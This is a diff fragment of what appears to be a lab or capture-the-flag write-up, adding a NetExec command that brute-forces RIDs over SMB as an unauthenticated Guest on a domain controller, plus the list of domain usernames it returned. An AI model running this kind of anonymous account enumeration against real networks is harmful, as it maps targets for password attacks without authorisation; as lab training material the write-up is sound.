@@ -114,5 +114,36 @@ SMB         10.129.234.63   445    DC               SYSVOL                      
 Read access on the `Public` share
 
 ```python
-
+nxc smb dc.phantom.vl -u 'Guest' -p '' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC$
+svc_sspr
+rnichols
+pharrison
+wsilva
+elynch
+nhamilton
+lstanley
+bbarnes
+cjones
+agarcia
+ppayne
+ibryant
+ssteward
+wstewart
+vhoward
+crose
+twright
+fhanson
+cferguson
+alucas
+ebryant
+vlynch
+ghall
+ssimpson
+ccooper
+vcunningham
 ```
+
